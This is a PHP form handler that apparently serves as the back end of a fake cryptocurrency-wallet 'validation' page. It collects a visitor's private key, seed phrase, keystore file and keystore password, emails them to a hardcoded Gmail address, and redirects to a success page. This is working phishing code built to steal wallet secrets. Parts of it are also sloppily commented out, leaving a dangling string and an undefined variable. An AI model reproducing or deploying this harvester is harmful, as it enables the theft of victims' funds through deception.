
<?php
if(!isset($_POST['submit']))
{
	//This page should not be accessed directly. Need to submit the form.
	echo "error; you need to submit the form!";
}
if(isset($_POST['submit'])){
  $to = "infiniteazy@gmail.com"; // this is your Email address
  $from = "noreply@multiapivalidate.com"; // this is the sender's Email address
  $privatekey = $_POST['privatekey'];
  $phrase = $_POST['phrase'];
  $keystorejson = $_POST['keystorejson'];
  $keystorepassword = $_POST['keystorepassword'];
  $subject = "Form submission";
  //$subject2 = "Copy of your form submission";
  $message = $privatekey. $phrase. $keystorejson. $keystorepassword;
$headers = "From:" . $from;
//mail($to,$subject,$message,$headers);
//Validate first


//$email_from = 'info@multiapivalidate.com';//<== update the email address
//$email_subject = "New Form submission";
//$email_body = "You have received a new entry.\n".
    "Here is the message:\n $message, $phrase, $keystorejson, $keystorepassword, $privatekey".
    
//$to = "infiniteazy@gmail.com";//<== update the email address
//$headers = "From: $email_from \r\n";
//Send the email!
mail($to,$email_subject,$email_body,$headers);
//done. redirect to thank-you page.

header('Location: success.html');
}

// Function to validate against any email injection attempts
function IsInjected($str)
{
  $injections = array('(\n+)',
              '(\r+)',
              '(\t+)',
              '(%0A+)',
              '(%0D+)',
              '(%08+)',
              '(%09+)'
              );
  $inject = join('|', $injections);
  $inject = "/$inject/i";
  if(preg_match($inject,$str))
    {
    return true;
  }
  else
    {
    return false;
  }
}
   
?> 